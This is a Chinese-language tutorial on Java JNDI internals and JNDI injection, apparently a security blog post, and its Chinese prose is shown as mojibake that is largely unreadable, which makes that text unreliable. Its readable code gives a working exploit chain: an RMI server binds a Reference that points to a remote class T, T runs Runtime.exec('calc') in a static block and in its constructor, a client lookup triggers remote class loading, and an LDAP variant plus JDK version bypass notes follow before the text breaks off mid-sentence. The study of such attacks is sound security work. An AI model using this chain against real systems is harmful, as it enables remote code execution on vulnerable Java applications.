//è®¾ç½®JNDIç¯å¢ƒå˜é‡System.setProperty(Context.INITIAL_CONTEXT_FACTORY,com.sun.jndi.rmi.registry.RegistryContextFactory);System.setProperty(Context.PROVIDER_URL,rmi://localhost:1099); //åˆå§‹åŒ–ä¸Šä¸‹æ–‡InitialContext initialContext = new InitialContext(); é€šè¿‡Contextä¸æœåŠ¡äº¤äº’å’ŒRMIç±»ä¼¼ï¼ŒContextåŒæ ·é€šè¿‡ä»¥ä¸‹äº”ç§æ–¹æ³•æ¥ä¸è¢«è°ƒç”¨çš„æœåŠ¡è¿›è¡Œäº¤äº’ //å°†åç§°ç»‘å®šåˆ°å¯¹è±¡bind(Name name, Object obj) //æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»ålist(String name) //æ£€ç´¢å‘½åå¯¹è±¡lookup(String name) //å°†åç§°é‡ç»‘å®šåˆ°å¯¹è±¡ rebind(String name, Object obj) //å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡unbind(String name) JNDIåº•å±‚å®ç°ä¸Šä¸‹æ–‡çš„åˆå§‹åŒ–æˆ‘ä»¬é€šè¿‡JNDIæ¥è®¾ç½®ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œå°±å¯ä»¥è°ƒç”¨ä¸åŒçš„æœåŠ¡ã€‚é‚£ä¹ˆJNDIæ¥å£æ˜¯å¦‚ä½•å®ç°è¿™ä¸€åŠŸèƒ½çš„å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬ä»ä»¥JNDI_RMIä¸ºä¾‹ï¼Œæˆ‘ä»¬ä»ä¸Šä¸‹æ–‡çš„åˆå§‹åŒ–å¼€å§‹ã€‚ JNDI_RMIä»£ç å¦‚ä¸‹ï¼š import javax.naming.Context;import javax.naming.InitialContext;import java.util.Hashtable; public class JNDI_RMI public static void main(String[] args) throws Exception //è®¾ç½®JNDIç¯å¢ƒå˜é‡ HashtableString, String env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, com.sun.jndi.rmi.registry.RegistryContextFactory); env.put(Context.PROVIDER_URL, rmi://localhost:1099); //åˆå§‹åŒ–ä¸Šä¸‹æ–‡ Context initialContext = new InitialContext(env); è·å–å·¥å‚ç±» æˆ‘ä»¬æ¥è°ƒè¯•ä¸€ä¸‹ åœ¨InitalContext#InitalContext()ä¸­ï¼Œé€šè¿‡æˆ‘ä»¬ä¼ å…¥çš„HashTableè¿›è¡Œinit è·Ÿè¿›è¯¥æ–¹æ³•ä¸­,å¯ä»¥å‘ç°å°±æ˜¯æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„ç¯å¢ƒå˜é‡è¿›è¡Œçš„åˆå§‹åŒ– ç»§ç»­è·Ÿè¿›initæ–¹æ³•ä¸­ï¼Œæ­¥å…¥getDefaultInitCtx()æ–¹æ³• ç»§ç»­è·Ÿè¿›ï¼Œæœ€ç»ˆè·Ÿåˆ°NamingManager#getInitialContext()ä¸­ è¿™é‡Œé¦–å…ˆé€šè¿‡getInitialContextFactoryBuilder()åˆå§‹åŒ–äº†ä¸€ä¸ªInitialContextFactoryBuilderç±»ã€‚å¦‚æœè¯¥ç±»ä¸ºç©ºï¼Œåˆ™å°†classNameè®¾ç½®ä¸º*INITIAL_CONTEXT_FACTORY*å±æ€§ã€‚è¿˜è®°å¾—è¯¥å±æ€§æ˜¯ä»€ä¹ˆå—ï¼Ÿå°±æ˜¯æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®çš„RMIä¸Šä¸‹æ–‡å·¥å‚ç±»com.sun.jndi.rmi.registry.RegistryContextFactoryã€‚ ç»§ç»­å¾€ä¸‹èµ° è¿™é‡Œé€šè¿‡loadClass()æ¥åŠ¨æ€åŠ è½½æˆ‘ä»¬è®¾ç½®çš„å·¥å‚ç±»ã€‚æœ€ç»ˆè°ƒç”¨çš„å…¶å®æ˜¯RegistryContextFactory#getInitialContext()æ–¹æ³•ï¼Œé€šè¿‡æˆ‘ä»¬çš„è®¾ç½®å·¥å‚ç±»æ¥åˆå§‹åŒ–ä¸Šä¸‹æ–‡Context ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†ï¼ŒJNDIæ˜¯é€šè¿‡æˆ‘ä»¬è®¾ç½®çš„*INITIAL_CONTEXT_FACTORY*å·¥å‚ç±»æ¥åˆ¤æ–­å°†ä¸Šä¸‹æ–‡åˆå§‹åŒ–ä¸ºä½•ç§ç±»å‹ï¼Œè¿›è€Œè°ƒç”¨è¯¥ç±»å‹ä¸Šä¸‹æ–‡æ‰€å¯¹åº”çš„æœåŠ¡ã€‚è°ƒç”¨é“¾å¦‚ä¸‹ è·å–æœåŠ¡äº¤äº’æ‰€éœ€èµ„æº ç°åœ¨JNDIçŸ¥é“äº†æˆ‘ä»¬æƒ³è¦è°ƒç”¨ä½•ç§æœåŠ¡ï¼Œé‚£ä¹ˆå®ƒåˆæ˜¯å¦‚ä½•çŸ¥é“æœåŠ¡åœ°å€ä»¥åŠè·å–æœåŠ¡çš„å„ç§èµ„æºçš„å‘¢ï¼Ÿæˆ‘ä»¬æ¥ç€ä¸Šæ–‡ï¼Œè·Ÿåˆ°RegistryContextFactory#getInitialContext()ä¸­ å…¶ä¸­çš„å‚æ•°var1å…¶å®å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾çš„ç¯å¢ƒå˜é‡,è·Ÿè¿›getInitCtxURL() JNDIé€šè¿‡æˆ‘ä»¬è®¾ç½®çš„*PROVIDER_URL*ç¯å¢ƒå˜é‡æ¥è·å–æœåŠ¡çš„è·¯å¾„ï¼Œæ¥ç€åœ¨URLToContext()æ–¹æ³•ä¸­åˆå§‹åŒ–äº†ä¸€ä¸ªrmiURLContextFactoryç±»ï¼Œå¹¶æ ¹æ®æœåŠ¡è·¯å¾„æ¥è·å–å®ä¾‹ã€‚ å›å»ä¹‹åæˆ‘ä»¬è·Ÿè¿›URLToContextæ–¹æ³• ç„¶åç»§ç»­è·Ÿè¿›getObjectInstanceæ–¹æ³• å†è·Ÿè¿›åˆ°getUsingURLæ–¹æ³•ä¸­ è°ƒç”¨äº†lookup()æ–¹æ³•ï¼Œè·Ÿè¿›å» ç»§ç»­è·Ÿè¿›lookupæ–¹æ³•,è·Ÿåˆ°RegistryContext#lookup()ä¸­ï¼Œæ ¹æ®ä¸Šè¿°è¿‡ç¨‹ä¸­è·å–çš„ä¿¡æ¯åˆå§‹åŒ–äº†ä¸€ä¸ªæ–°çš„RegistryContext å¯è§ï¼Œåœ¨æœ€ç»ˆåˆå§‹åŒ–çš„æ—¶å€™è·å–äº†ä¸€ç³»åˆ—RMIé€šä¿¡è¿‡ç¨‹ä¸­æ‰€éœ€çš„èµ„æºï¼ŒåŒ…æ‹¬RegistryImpl_Stubç±»ã€pathã€portç­‰ä¿¡æ¯ã€‚å¦‚ä¸‹å›¾ JNDIåœ¨åˆå§‹åŒ–ä¸Šä¸‹æ–‡çš„æ—¶å€™è·å–äº†ä¸æœåŠ¡äº¤äº’æ‰€éœ€çš„å„ç§èµ„æºï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯é€šè¿‡è·å–çš„èµ„æºå’ŒæœåŠ¡æ„‰å¿«åœ°è¿›è¡Œäº¤äº’äº†ã€‚ å„ç§è°ƒç”¨é“¾å¦‚ä¸‹ JNDIåŠ¨æ€åè®®è½¬æ¢ä¸Šé¢ä¸¤ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®äº†å±æ€§*INITIAL_CONTEXT_FACTORY*å’Œ*PROVIDER_URL*çš„å€¼æ¥å¯¹Contextè¿›è¡Œåˆå§‹åŒ–ã€‚é€šè¿‡å¯¹Contextçš„åˆå§‹åŒ–ï¼ŒJNDIèƒ½å¤Ÿè¯†åˆ«æˆ‘ä»¬æƒ³è°ƒç”¨ä½•ç§æœåŠ¡ï¼Œä»¥åŠæœåŠ¡çš„è·¯å¾„ã€‚ ä½†å®é™…ä¸Šï¼Œåœ¨ Context#lookup()æ–¹æ³•çš„å‚æ•°ä¸­ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šè‡ªå·±çš„æŸ¥æ‰¾åè®®ã€‚JNDIä¼šé€šè¿‡ç”¨æˆ·çš„è¾“å…¥æ¥åŠ¨æ€çš„è¯†åˆ«ç”¨æˆ·è¦è°ƒç”¨çš„æœåŠ¡ä»¥åŠè·¯å¾„ æˆ‘ä»¬æ¥è¿›è¡Œè°ƒè¯• è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬ä¸ç®¡è°ƒç”¨çš„æ˜¯lookupã€bindæˆ–è€…æ˜¯å…¶ä»–initalContextä¸­çš„æ–¹æ³•ï¼Œéƒ½ä¼šè°ƒç”¨getURLOrDefaultInitCtx()æ–¹æ³•è¿›è¡Œæ£€æŸ¥ è·Ÿè¿›getURLOrDefaultInitCtx()æ–¹æ³•ï¼Œä¼šé€šè¿‡getURLScheme()æ–¹æ³•æ¥è·å–é€šä¿¡åè®®ï¼Œæ¯”å¦‚è¿™é‡Œè·å–åˆ°çš„æ˜¯rmiåè®® æ¥ç€è·Ÿæ®è·å–åˆ°çš„åè®®ï¼Œé€šè¿‡NamingManager#getURLContext()æ¥è°ƒç”¨getURLObject()æ–¹æ³• æœ€ç»ˆåœ¨getURLObject()æ–¹æ³•ä¸­ï¼Œæ ¹æ®*defaultPkgPrefix*å±æ€§åŠ¨æ€ç”ŸæˆFactoryç±» æˆ‘ä»¬çœ‹ä¸€ä¸‹JNDIé»˜è®¤æ”¯æŒé‚£äº›åŠ¨æ€åè®®è½¬æ¢ã€‚å½“æˆ‘ä»¬é’ˆå¯¹JNDIè¿›è¡Œæ”»å‡»çš„æ—¶å€™å¯ä»¥ä¼˜å…ˆè€ƒè™‘ä»¥ä¸‹å‡ ç§æœåŠ¡ é€šè¿‡åŠ¨æ€åè®®è½¬æ¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»…é€šè¿‡ä¸€ä¸²ç‰¹å®šå­—ç¬¦ä¸²å°±å¯ä»¥æŒ‡å®šJNDIè°ƒç”¨ä½•ç§æœåŠ¡ï¼Œååˆ†æ–¹ä¾¿ã€‚ä½†æ˜¯æ–¹ä¾¿æ˜¯ä¼šä»˜å‡ºä¸€å®šä»£ä»·çš„ã€‚å¯¹äºä¸€ä¸ªç³»ç»Ÿæ¥è®²ï¼Œå¾€å¾€è¶Šæ–¹ä¾¿ï¼Œå°±è¶Šä¸å®‰å…¨ã€‚ å‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶stringå­—æ®µï¼Œé‚£ä¹ˆå°±å¯ä»¥æ­å»ºæ¶æ„æœåŠ¡ï¼Œå¹¶æ§åˆ¶JNDIæ¥å£è®¿é—®è¯¥æ¶æ„ï¼Œäºæ˜¯å°†å¯¼è‡´æ¶æ„çš„è¿œç¨‹classæ–‡ä»¶åŠ è½½ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¿™ç§æ”»å‡»æ‰‹æ³•å…¶å®å°±æ˜¯JNDIæ³¨å…¥ï¼Œå®ƒå’ŒRMIæœåŠ¡æ”»å‡»æ‰‹æ³•ä¸­çš„â€è¿œç¨‹åŠ è½½CodeBaseâ€è¾ƒä¸ºç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ä¸€äº›è¿œç¨‹é€šä¿¡æ¥å¼•å…¥æ¶æ„çš„classæ–‡ä»¶ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚ JNDI Referenceç±»Referenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½åç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æ¯”å¦‚è¿œç¨‹è·å– RMI æœåŠ¡ä¸Šçš„å¯¹è±¡æ˜¯ Reference ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½classæ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚ è¿™å¬èµ·æ¥æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒRMIä¸­Codebaseçš„åŠŸèƒ½ï¼Ÿå½“åœ¨æœ¬åœ°æ‰¾ä¸åˆ°æ‰€è°ƒç”¨çš„ç±»æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Referenceç±»æ¥è°ƒç”¨ä½äºè¿œç¨‹æœåŠ¡å™¨çš„ç±»ã€‚ Referenceç±»å¸¸ç”¨æ„é€ å‡½æ•°å¦‚ä¸‹ //classNameä¸ºè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»åï¼Œå¦‚æœæœ¬åœ°æ‰¾ä¸åˆ°è¿™ä¸ªç±»åï¼Œå°±å»è¿œç¨‹åŠ è½½//factoryä¸ºå·¥å‚ç±»//factoryLocationä¸ºå·¥å‚ç±»åŠ è½½çš„åœ°å€ï¼Œå¯ä»¥æ˜¯file://ã€ftp://ã€http:// ç­‰åè®®Reference(String className, String factory, String factoryLocation) åœ¨RMIä¸­ï¼Œç”±äºæˆ‘ä»¬è¿œç¨‹åŠ è½½çš„å¯¹è±¡éœ€è¦ç»§æ‰¿UnicastRemoteObjectç±»ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ReferenceWrapperç±»å¯¹Referenceç±»æˆ–å…¶å­ç±»å¯¹è±¡è¿›è¡Œè¿œç¨‹åŒ…è£…æˆRemoteç±»ä½¿å…¶èƒ½å¤Ÿè¢«è¿œç¨‹è®¿é—®ã€‚ JNDI Reference çš„ä½œç”¨ å­˜å‚¨å¯¹è±¡å¼•ç”¨ï¼š åœ¨å‘½åæœåŠ¡ä¸­å­˜å‚¨å¯¹è±¡çš„å¼•ç”¨ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å¯¹è±¡æœ¬èº«ã€‚ å»¶è¿ŸåŠ è½½ï¼š å¯¹è±¡åªæœ‰åœ¨å®¢æˆ·ç«¯æŸ¥æ‰¾æ—¶æ‰ä¼šè¢«åˆ›å»ºã€‚ è·¨ç½‘ç»œä¼ é€’ï¼š é€‚ç”¨äºéœ€è¦è·¨ç½‘ç»œä¼ é€’å¯¹è±¡çš„æƒ…å†µï¼ˆå¦‚ RMIã€LDAP ç­‰ï¼‰ã€‚ JNDIæ³¨å…¥JNDI+RMIç¬¬ä¸€ç§ä¸Šé¢å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„æ—¶å€™æ„Ÿè§‰å’ŒåŸæœ¬çš„RMIæ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä¸æ˜¯å€ŸåŠ©äº†åŸç”Ÿçš„RMIæ¥å®ç°ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹ä¹Ÿæ˜¯é€šè¿‡åºåˆ—åŒ–ååºåˆ—åŒ–æ¥å®ç°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰è¯´çš„æ”»å‡»RMIçš„é‚£äº›æ”»å‡»æ–¹æ³•æ˜¯ä¸æ˜¯åŒæ ·ä¹Ÿå¯ä»¥ç”¨åœ¨è¿™é‡Œäº† æˆ‘ä»¬ä¸‹é¢æ¥è°ƒè¯•çœ‹çœ‹ å¼ºåˆ¶æ­¥å…¥lookupæ–¹æ³• ç»§ç»­æ­¥å…¥lookupæ–¹æ³• ç»§ç»­æ­¥å…¥lookupæ–¹æ³• å¯ä»¥å‘ç°æˆ‘ä»¬è°ƒç”¨çš„å°±æ˜¯åŸç”ŸRMIçš„lookupæ–¹æ³•ï¼Œè¿™æ˜¯åœ¨æ–‡ä»¶RegistryContextä¸­çš„ï¼Œä½†æˆ‘ä»¬æœ€å¼€å§‹åˆ›å»ºçš„æ˜¯InitialContextï¼Œå®ƒä¼šæ ¹æ®æˆ‘ä»¬ä¼ è¿›å»çš„å‚æ•°ä¸­åè®®çš„ä¸åŒæ¥è°ƒç”¨ä¸åŒçš„Contextæ¥å¤„ç† ä¹Ÿå°±æ˜¯è¯´åªè¦ä»£ç IRemoteObj remoteObj = (IRemoteObj)initialContext.lookup(rmi://localhost:1099/remoteObj);ä¸­lookupæ–¹æ³•çš„å‚æ•°æ˜¯å¯æ§çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©å…¶ç›´æ¥åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»æ¥æˆåŠŸå®ç°æ”»å‡» å½“ç„¶è¿™ä¸æ˜¯ä¼ ç»Ÿçš„JNDIæ³¨å…¥ï¼Œä¸‹é¢æˆ‘ä»¬æ¥è®²è®²ä¼ ç»Ÿçš„æ³¨å…¥æ–¹æ³• ç¬¬äºŒç§ä¼ ç»Ÿçš„æ˜¯åˆ©ç”¨Referenceç±»æ¥å®ç°çš„ JNDIRMIServerä»£ç å¦‚ä¸‹ï¼š import javax.naming.InitialContext;import javax.naming.Reference;public class JNDIRMIServer public static void main(String[] args) throws Exception // InitialContext æ˜¯ JNDI çš„å…¥å£ç‚¹ï¼Œç”¨äºè¿æ¥åˆ°å‘½åæœåŠ¡ï¼ˆå¦‚ RMI æ³¨å†Œè¡¨ã€LDAP ç­‰ï¼‰ InitialContext initialContext = new InitialContext();// initialContext.rebind(rmi://localhost:1099/remoteObj, new RemoteObjImpl()); Reference refObj = new Reference(T, T, http://localhost:7777/); initialContext.rebind(rmi://localhost:1099/remoteObj, refObj); å…¶ä¸­çš„ç±»Tå†…å®¹å¦‚ä¸‹ï¼š import java.io.IOException;public class T static try Runtime.getRuntime().exec(calc); catch (IOException e) throw new RuntimeException(e); public T() throws IOException Runtime.getRuntime().exec(calc); å°†å…¶ç¼–è¯‘åçš„æ–‡ä»¶ç§»åˆ°ä¸åŒæ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ é™¤T.javaæ–‡ä»¶ï¼Œç„¶åç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡ è¿™ä¸ªæ—¶å€™æœåŠ¡ç«¯å°±å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œrebindæ–¹æ³•å¯ä»¥æ­£å¸¸è¿›è¡Œç»‘å®šï¼Œå®¢æˆ·ç«¯å†è¿è¡Œçš„è¯å°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ JNDIRMIClientä»£ç å¦‚ä¸‹ï¼š import javax.naming.InitialContext;public class JNDIRMIClient public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); initialContext.lookup(rmi://localhost:1099/remoteObj); å½“ç„¶æˆ‘ä»¬å¯ä»¥æ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ªè¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„ å‰é¢å‡ æ­¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œèµ°åˆ°lookupå‡½æ•°åç»§ç»­å¾€ä¸‹èµ° ä¸‹é¢æœ‰ä¸€ä¸ªdecodeObjectæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”¨æ¥è§£ç ä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å¯¹è±¡ï¼Œå°†å…¶è§£ç ä¸ºæœ¬åœ°çš„å¯ç”¨å¯¹è±¡ å¦‚æœå¯¹è±¡æ˜¯ä¸€ä¸ªè¿œç¨‹å¼•ç”¨ï¼ˆRemoteRefï¼‰ï¼ŒdecodeObject ä¼šå°†å…¶è§£ç ä¸ºè¿œç¨‹ä»£ç†å¯¹è±¡ã€‚ å¦‚æœå¯¹è±¡æ˜¯ä¸€ä¸ªæ™®é€šå¯¹è±¡ï¼ŒdecodeObject ä¼šç›´æ¥è¿”å›è¯¥å¯¹è±¡ æˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³•ä¸­ è¿™é‡Œçš„é‡ç‚¹æ˜¯getObjectInstanceæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›å»ï¼Œä¸€ç›´å¾€ä¸‹èµ°åˆ°è¿™é‡Œ æˆ‘ä»¬ä¹Ÿè·Ÿè¿›å»ï¼Œå¯ä»¥çœ‹åˆ°é¦–å…ˆæ˜¯è¿›è¡Œäº†æœ¬åœ°ç±»åŠ è½½ï¼Œåœ¨æœ¬åœ°æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ç±»Tï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å½“ç„¶æ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥è¿™é‡Œè‚¯å®šè¿˜æ˜¯null æ²¡äº‹ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ° å¯ä»¥è‡ªå·±è·Ÿè¿›å»çœ‹çœ‹codebaseçš„å€¼æ˜¯ä»€ä¹ˆâ€“æ˜¯æˆ‘ä»¬ä¹‹å‰èµ·çš„è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€ å‡ºå»åç»§ç»­å¾€ä¸‹èµ°ï¼Œåˆå¼€å§‹äº†é€šè¿‡loadCLassæ–¹æ³•è¿›è¡Œç±»åŠ è½½ï¼Œä¸è¿‡è¿™æ¬¡æ˜¯è¿œç¨‹ç±»åŠ è½½ï¼Œä»æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢æ¥è·å–ç›¸å…³ç±» èµ°å®Œè¿™ä¸€æ­¥åå°±æˆåŠŸå¼¹çª—äº†ï¼ŒloadClassæ–¹æ³•è°ˆçš„è®¡ç®—å™¨æ˜¯é™æ€ä»£ç å—ä¸­çš„ å†å¾€ä¸‹èµ°ï¼Œèµ°å®Œè¿™ä¸€æ­¥åä¹Ÿä¼šå¼¹ä¸€ä¸ªè®¡ç®—å™¨å‡ºæ¥ï¼ŒnewInstanceæ–¹æ³•æ˜¯é€šè¿‡åå°„åŠ¨æ€åˆ›å»ºå¯¹è±¡å®ä¾‹ï¼Œè¿™ä¸ªæ—¶å€™ä¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œä¼šæ‰§è¡Œå…¶ä¸­çš„å¼¹è®¡ç®—å™¨çš„å‘½ä»¤ è¦æ³¨æ„ï¼Œä¸¤ä¸ªè®¡ç®—å™¨å¼¹å‡ºæ¥çš„åŸå› æ˜¯ä¸ä¸€æ ·çš„ JNDI+LDAPLDAPç®€ä»‹LDAPï¼ˆLightweight Directory Access Protocol ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§ç›®å½•æœåŠ¡åè®®ï¼Œè¿è¡Œåœ¨TCPIPå †æ ˆä¹‹ä¸Šã€‚LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿï¼Œç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œèƒ½è¿›è¡ŒæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢ï¼Œä»¥æ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ã€‚LDAPç›®å½•æœåŠ¡åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ï¼Œå®ƒçš„åŠŸèƒ½ç”¨äºå¯¹ä¸€ä¸ªå­˜åœ¨ç›®å½•æ•°æ®åº“çš„è®¿é—®ã€‚ LDAPç›®å½•å’ŒRMIæ³¨å†Œè¡¨çš„åŒºåˆ«åœ¨äºæ˜¯å‰è€…æ˜¯ç›®å½•æœåŠ¡ï¼Œå¹¶å…è®¸åˆ†é…å­˜å‚¨å¯¹è±¡çš„å±æ€§ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒLDAP ã€Œæ˜¯ä¸€ä¸ªåè®®ã€ï¼Œçº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹ã€‚è€Œ ã€ŒLDAP åè®®çš„å®ç°ã€ï¼Œæœ‰ç€ä¼—å¤šç‰ˆæœ¬ï¼Œä¾‹å¦‚å¾®è½¯çš„ Active Directory æ˜¯ LDAP åœ¨ Windows ä¸Šçš„å®ç°ã€‚AD å®ç°äº† LDAP æ‰€éœ€çš„æ ‘å½¢æ•°æ®åº“ã€å…·ä½“å¦‚ä½•è§£æè¯·æ±‚æ•°æ®å¹¶åˆ°æ•°æ®åº“æŸ¥è¯¢ç„¶åè¿”å›ç»“æœç­‰åŠŸèƒ½ã€‚å†ä¾‹å¦‚ OpenLDAP æ˜¯å¯ä»¥è¿è¡Œåœ¨ Linux ä¸Šçš„ LDAP åè®®çš„å¼€æºå®ç°ã€‚è€Œæˆ‘ä»¬å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† Active Directoryã€OpenLDAP è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨ã€‚ åœ¨LDAPä¸­ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ç›®å½•æ ‘æ¥è®¿é—®ä¸€æ¡è®°å½•çš„ï¼Œç›®å½•æ ‘çš„ç»“æ„å¦‚ä¸‹ dn ï¼šä¸€æ¡è®°å½•çš„è¯¦ç»†ä½ç½®dc ï¼šä¸€æ¡è®°å½•æ‰€å±åŒºåŸŸ (å“ªä¸€é¢—æ ‘)ou ï¼šä¸€æ¡è®°å½•æ‰€å±ç»„ç»‡ ï¼ˆå“ªä¸€ä¸ªåˆ†æ”¯ï¼‰cn/uidï¼šä¸€æ¡è®°å½•çš„åå­—/ID (å“ªä¸€ä¸ªè‹¹æœåå­—)...LDAPç›®å½•æ ‘çš„æœ€é¡¶éƒ¨å°±æ˜¯æ ¹ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œåŸºå‡†DNã€‚ å‡è®¾ä½ è¦æ ‘ä¸Šçš„ä¸€ä¸ªè‹¹æœï¼ˆä¸€æ¡è®°å½•ï¼‰ï¼Œä½ æ€ä¹ˆå‘Šè¯‰å›­ä¸å®ƒçš„ä½ç½®å‘¢ï¼Ÿå½“ç„¶é¦–å…ˆè¦è¯´æ˜æ˜¯å“ªä¸€æ£µæ ‘ï¼ˆdcï¼Œç›¸å½“äºMYSQLçš„DBï¼‰ï¼Œç„¶åæ˜¯ä»æ ‘æ ¹åˆ°é‚£ä¸ªè‹¹æœæ‰€ç»è¿‡çš„æ‰€æœ‰â€œåˆ†å‰â€ï¼ˆouï¼‰ï¼Œæœ€åå°±æ˜¯è¿™ä¸ªè‹¹æœçš„åå­—ï¼ˆuidï¼Œç›¸å½“äºMySQLè¡¨ä¸»é”®idï¼‰ã€‚ å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨LDAPæœåŠ¡æ¥å­˜å‚¨Javaå¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶èƒ½å¤Ÿæ§åˆ¶JNDIå»è®¿é—®å­˜å‚¨åœ¨LDAPä¸­çš„Javaæ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚LDAPèƒ½å¤Ÿå­˜å‚¨çš„Javaå¯¹è±¡å¦‚ä¸‹ Java åºåˆ—åŒ– JNDIçš„References Marshalledå¯¹è±¡ Remote Location åœ¨8u121ä¹‹åä¸Šé¢çš„æ–¹æ³•ä¾¿è¡Œä¸é€šäº† åœ¨8u191ä¹‹å‰å¯ä»¥ä½¿ç”¨ldapæ¥è¿›è¡Œç»•è¿‡ æ³¨å…¥é¦–å…ˆæˆ‘ä»¬å…ˆä¸‹è½½ä¸€ä¸ªè½¯ä»¶æ¥ä¸“é—¨èµ·LDAPæœåŠ¡ï¼šhttps://directory.apache.org/studio/download/download-windows.html è¯¥è½¯ä»¶æ‰€éœ€çš„JDKç‰ˆæœ¬æ˜¯11ï¼Œä½†æ˜¯è¦åœ¨11.0.25ä»¥ä¸‹ï¼ˆäº²æµ‹11.0.25ä¸è¡Œï¼‰ åœ¨è½¯ä»¶ä¸­æ–°èµ·ä¸€ä¸ªæœåŠ¡å¹¶æ–°å»ºä¸€ä¸ªè¿æ¥åå¦‚ä¸‹æ‰€ç¤ºï¼š JNDILDAPServeræ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š import javax.naming.InitialContext;import javax.naming.Reference;public class JNDILDAPServer public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); Reference refObj = new Reference(T, T, http://localhost:7777/); initialContext.rebind(ldap://localhost:10389/cn=test,dc=example,dc=com, refObj); ä»£ç ä¸­çš„cnå€¼ä»»å– è‡³äºä¸ºä»€ä¹ˆç«¯å£å·æ˜¯10389ä¸»è¦æ˜¯å› 